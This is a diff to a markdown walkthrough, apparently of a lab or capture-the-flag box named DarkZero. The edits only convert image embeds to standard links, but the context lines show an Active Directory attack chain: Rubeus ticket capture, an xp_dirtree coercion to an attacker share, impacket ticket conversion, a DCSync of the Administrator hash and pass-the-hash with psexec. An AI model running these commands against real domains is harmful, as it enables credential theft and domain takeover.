@@ -197,7 +197,7 @@ shell
 C:\temp\Rubeus.exe monitor /interval:5
 ```
 
-![[Pasted image 20251009184257.png]]
+![Pasted image 20251009184257.png](/assets/images/2025-10-09-DarkZero/Pasted image 20251009184257.png)
 
 Rubeus is now listening for incoming Kerberos tickets and will capture any ticket used for authentication on the VM.
 
@@ -211,9 +211,9 @@ Rubeus is now listening for incoming Kerberos tickets and will capture any ticke
 EXEC xp_dirtree '\\\\VM_IP\\share';
 ```
 
-![[Pasted image 20251009184411.png]]
+![Pasted image 20251009184411.png](/assets/images/2025-10-09-DarkZero/Pasted image 20251009184411.png)
 
-![[Pasted image 20251009184429.png]]
+![Pasted image 20251009184429.png](/assets/images/2025-10-09-DarkZero/Pasted image 20251009184429.png)
 
 <div class="divider divider-root">
     <span class="divider-title">TGT Captured</span>
@@ -230,7 +230,7 @@ EXEC xp_dirtree '\\\\VM_IP\\share';
 echo "[BASE64_TICKET]" > ticket.b64
 ```
 
-![[Pasted image 20251009184534.png]]
+![Pasted image 20251009184534.png](/assets/images/2025-10-09-DarkZero/Pasted image 20251009184534.png)
 
 **Step 2:** Decode and convert to ccache format
 ```bash
@@ -244,7 +244,7 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 export KRB5CCNAME=ticket.ccache
 ```
 
-![[Pasted image 20251009184606.png]]
+![Pasted image 20251009184606.png](/assets/images/2025-10-09-DarkZero/Pasted image 20251009184606.png)
 
 ---
 
@@ -266,7 +266,7 @@ sudo ntpdate DC_IP
 impacket-secretsdump -k -no-pass DC01.DOMAIN.LOCAL -just-dc-user Administrator
 ```
 
-![[Pasted image 20251009184705.png]]
+![Pasted image 20251009184705.png](/assets/images/2025-10-09-DarkZero/Pasted image 20251009184705.png)
 
 **Successfully extracted Administrator NTLM hash**
 
@@ -279,7 +279,7 @@ impacket-secretsdump -k -no-pass DC01.DOMAIN.LOCAL -just-dc-user Administrator
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:[ADMIN_HASH] Administrator@DC01.DOMAIN.LOCAL
 ```
 
-![[Pasted image 20251009184749.png]]
+![Pasted image 20251009184749.png](/assets/images/2025-10-09-DarkZero/Pasted image 20251009184749.png)
 
 <div class="divider divider-root">
     <span class="divider-title">Domain Compromised</span>
